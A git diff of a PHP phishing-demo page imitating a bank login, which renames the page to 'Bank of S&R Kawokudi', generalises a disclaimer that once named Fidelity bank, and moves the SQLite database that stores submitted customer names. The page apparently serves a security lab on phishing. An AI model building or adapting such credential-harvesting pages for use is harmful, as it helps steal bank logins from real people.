@@ -34,8 +34,8 @@
 <body>
 
     <div id="header">
-		<div id="_topMenu">
-		
+		<div id="myHead">
+        <p style="font-family: Garamond, serif;   font-size: 150%; font-weight: bold;"> Bank of S&R Kawokudi</p>
 		</div>
 		<form name="frmlang" method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
 			
@@ -93,7 +93,7 @@
 
 
                                             <div id="disclaimer" class="text-right" style="color: red; font-weight:bold">
-                                                <p>DISCLAMER: This page is created for educational purposes ONLY to demonstrate phishing attack. Please, do not enter your Fidelity bank information here. Thank you</p>
+                                                <p>DISCLAMER: This page is created for educational purposes ONLY to demonstrate phishing attack. Please, do not enter your bank information here. Thank you</p>
                                             </div>
                                     </div>
                                 </div>
@@ -109,7 +109,7 @@
 
 
 <?php
-$db = new PDO("sqlite:/home/kali/wwwdata/fidelityusers.db");
+$db = new PDO("sqlite:/home/kali/mybankphish/fidelityusers.db");
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
   // collect value of input field
   $myUsername = $_POST['myCustomerName'];
